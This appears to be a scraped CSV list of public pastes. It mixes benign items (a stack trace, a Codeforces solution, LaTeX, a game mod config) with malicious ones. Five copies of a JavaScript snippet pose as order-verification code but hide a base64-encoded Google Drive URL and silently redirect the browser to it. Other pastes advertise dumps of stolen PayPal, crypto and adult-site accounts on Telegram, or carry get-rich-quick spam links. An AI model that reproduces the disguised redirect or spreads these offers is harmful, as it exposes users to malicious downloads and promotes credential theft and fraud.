id,title,username,language,date,content
fvfLUCfK,Untitled,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:35:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79496/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nLVwDkWZ,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 1st of May 2025 06:35:39 AM CDT,85196 Accounts Posted On https://t.me/leakzbyeminem
V03MUNQq,EARN $900 INSTANTLY 2025⭐ GV,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:30:17 AM CDT," 
Pdf https://tinyurl.com/freshleaks

OyHkTQDFB3
"
TK48DM0Z,Make $1000 15-MINUTES  (BEGINNER) YR,Expired_MRE,JavaScript,Thursday 1st of May 2025 06:21:04 AM CDT," 
Pdf https://tinyurl.com/freshleaks

ZlVtftrud3
"
KANWgkP5,Products.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:20:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21317/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S7JzP07A,Chaturbate with Tokens,x2LeaF,JavaScript,Thursday 1st of May 2025 06:20:17 AM CDT,09372 Accounts Posted On https://t.me/leakzbyeminem
mUfyeGSP,2025-05-01T13:16:18.159518,powerampache,PHP,Thursday 1st of May 2025 06:16:18 AM CDT,"1.01-78 (78) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:210)
	at android.os.Looper.loop(Looper.java:299)
	at android.app.ActivityThread.main(ActivityThread.java:8261)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:559)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:954)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
fvrXi3Xm,Make $1000 15-MINUTES (BEGINNER) L4,cdmghxtc1999,JavaScript,Thursday 1st of May 2025 06:11:50 AM CDT," 
Pdf https://tinyurl.com/freshleaks

nzb1Pb57qL
"
ap7Xa2Fj,Order.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 06:04:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65271/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z66A3tfh,Crypto Accounts,x2LeaF,JavaScript,Thursday 1st of May 2025 06:04:55 AM CDT,71230 Accounts Posted On https://t.me/leakzbyeminem
Qq7SvVS0,dataNone,TestGuy1,JSON,Thursday 1st of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c499ddb58a52a76f517e78bf4ca62e1657d1192a113a13d6df7f718dc1b343489337207104e3fe8b17177e451823c34f613a614bd596ce43c05b1b93de6d6fbc32eafdadb4b941a5f9409648b496aed09160ee6d7b04e5273e2525b044cd89ea682a282fd0e38fe2b24d9053e8fd5ce2f8d095c0c64c98e35f350971b726f46c',
  otherdata: [
    '15d4457edbd6038766d1aa184a6a4371',
    '9a3c68e0dbaaff57c63945cd4fa7caa4',
    '8a3d8fd3ca6d6ed4b5739f9eac5883a6',
    'aedfcc8c5a83e091c0cfdc1e35adf102',
    '7e350e7f6417139333bbaecd7c6ef4fe',
    '5fafd05082a9cf05cf999c2d8b5e3733',
    'b20c315edc0143b154c02ab3b2e6b3b6',
    '8eb2d919e3fca72df75a62db344507c9'
  ]
}"
73DwNLqg,CF1731C,pb_jiang,C++,Thursday 1st of May 2025 05:55:47 AM CDT,"// Problem: C. Even Subarrays
// Contest: Codeforces - Codeforces Round 841 (Div. 2) and Divide by Zero 2022
// URL: https://codeforces.com/problemset/problem/1731/C
// Memory Limit: 256 MB
// Time Limit: 2500 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n;
    cin >> n;
    vl a(n);
    for (auto &x : a)
        cin >> x;

    ll tot = n * (n + 1) / 2, sub = 0;
    vl cnt(2 * n);
    cnt[0] = 1;

    for (ll i = 0, sum = 0; i < n; ++i) {
        sum = sum ^ a[i];
        for (ll j = 0; j * j < 2 * n; ++j) {
            ll tg = sum ^ (j * j);
            /*
            // TLE with cnt a map
            if (cnt.count(tg))
                dbg(tg, sum, j * j, cnt[tg]), sub += cnt[tg];
            */
            if (tg < 2 * n)
                sub += cnt[tg];
        }
        cnt[sum] += 1;
    }

    dbg(tot, sub);
    cout << tot - sub << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);

    ll t;
    cin >> t;
    while (t--)
        solve();

    return 0;
};
"
4SFSwC56,Untitled,mayankjoin3,Latex,Thursday 1st of May 2025 05:52:06 AM CDT,"\documentclass{ieeeaccess}
% \usepackage{longtable}
% \usepackage[utf8]{inputenc}
% \usepackage[a4paper,left=2.9cm,right=2cm,top=2cm,bottom=2.25cm]{geometry}
\usepackage{caption}
% \usepackage{lipsum} % for dummy text
% \usepackage{graphicx}
% \usepackage{mathtools} % amsmath with extensions
% \usepackage{amsfonts} % (otherwise \mathbb does nothing)
% \usepackage{amsmath}
% \usepackage{amssymb}
% % \usepackage{natbib}
% \usepackage{longtable}
% \usepackage{lipsum}
% \usepackage{float}
% \usepackage[utf8]{inputenc}
\usepackage{longtable}
% \usepackage{xcolor}
% \usepackage{xcolor,colortbl}
\usepackage[usenames,dvipsnames]{xcolor,colortbl}


% \definecolor{LightBlue}{rgb}{0.88,0.92,0.96} % Define a light blue color
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
% \renewcommand{\headrulewidth}{0pt} % Removes the header rule

\usepackage{booktabs} % For prettier tables
\usepackage{makecell} % Allows for line breaks within table cells
\usepackage{tabularx} % For tables that span the width of the page
\usepackage{subcaption}
\captionsetup{compatibility=false}
% \usepackage[sort&compress,square,comma,authoryear]{natbib}
\usepackage{authblk}
% \usepackage{svg}
% \usepackage{lineno}
% \linenumbers
% \usepackage{gensymb}%https://www.overleaf.com/project/6544eab4f0a2f7eb166b931b
% \usepackage{amsmath}
% \usepackage{algpseudocode}
\usepackage{algorithm}
\usepackage{algorithmic}
% \usepackage{subfig}
\usepackage{url}
\usepackage{comment}
% \usepackage{lineno}
% % \linenumbers
\usepackage[hidelinks]{hyperref}
\usepackage{multirow}
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{algorithmic}
\usepackage{graphicx}
\usepackage{textcomp}


These are packages causing conflict. Please fix them and also fix this algo 


\begin{algorithm}[!htb]
\caption{Balance Dataset with ADASYN}
\label{algo:ADASYN}
\DontPrintSemicolon

\KwIn{Imbalanced DataFrame \texttt{df}}
\KwOut{Balanced DataFrame \texttt{balanced\_df}}

\BlankLine
\textbf{Print:} ``Applying ADASYN for class balancing...'' \;

\BlankLine
\textbf{Prepare features and label:} \;
\If{\texttt{""label""} in df.columns}{
    $X \leftarrow \texttt{df.drop([""label"", ""attack\_cat""], axis=1)}$ \;
}
\Else{
    $X \leftarrow \texttt{df.drop([""attack\_cat""], axis=1)}$ \;
}
$y \leftarrow \texttt{df[""attack\_cat""]}$ \;

\BlankLine
\textbf{Apply ADASYN:} \;
adasyn $\leftarrow$ ADASYN(random\_state=42, n\_neighbors=5) \;
$X_{\text{resampled}}, y_{\text{resampled}} \leftarrow$ adasyn.fit\_resample($X$, $y$) \;

\BlankLine
\textbf{Create balanced dataframe:} \;
balanced\_df $\leftarrow$ DataFrame($X_{\text{resampled}}$, columns=$X$.columns) \;
balanced\_df[``attack\_cat""] $\leftarrow y_{\text{resampled}}$ \;

\BlankLine
\textbf{Print:} ``After ADASYN: \texttt{balanced\_df.shape[0]} records'' \;
\textbf{Print:} ``Balanced attack distribution: \texttt{balanced\_df[""attack\_cat""].value\_counts().to\_dict()}'' \;

\Return balanced\_df \;

\end{algorithm}"
h661NdXP,Market.js,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:49:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TRcX5Mc2,PayPal with Balance,x2LeaF,JavaScript,Thursday 1st of May 2025 05:49:33 AM CDT,27611 Accounts Posted On https://t.me/leakzbyeminem
Ni7bbZhv,Untitled,hubertzoo90,JavaScript,Thursday 1st of May 2025 05:34:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05236/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rz5gLYNz,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 1st of May 2025 05:34:12 AM CDT,30657 Accounts Posted On https://t.me/leakzbyeminem
xG9UhUq7,ldf camo,Gamenator,C++,Thursday 1st of May 2025 05:33:44 AM CDT,"//cfgweapon
class FLPMC_combatspcfed: U_I_E_Uniform_01_F{
              author= ""Gamenator"";
              scope=2;
              scopeArsenal=2;
              allowedSlots[]={901};
              displayName=""Combat Fatigues (Pacific Woodland)"";
              model = ""\A3\Characters_F\Common\Suitpacks\suitpack_original_F.p3d"";
              hiddenSelectionsTextures[]=
            {
                      ""Uniforms\fed\spc_fed_co.paa"",
                      ""Uniforms\fed\clothing_co_fed.paa""
            };
              class ItemInfo: UniformItem
              {
                  uniformModel=""-"";
                  uniformClass=""FLPMC_combatspcfedcv"";
                  containerClass=""Supply40"";
                  mass=40;
              };



        };
//cfgvehicle
class FLPMC_combatspcfedcv: I_E_Soldier_F
            {
              author= ""Gamenator"";
              scope = 1;
              scopeCurator = 0;
              hiddenSelections[]=
                  {
                  ""camo"",
				  ""camo2"",
				  ""insignia""
                  };
                  hiddenSelectionsTextures[] =
                  {
                      ""Uniforms\fed\spc_fed_co.paa"",         // torso texture
                      ""Uniforms\fed\clothing_co_fed.paa""     // pants texture
                  };
                  uniformClass= ""FLPMC_combatspcfed""; //CfgWeapons classname here
              
              };"
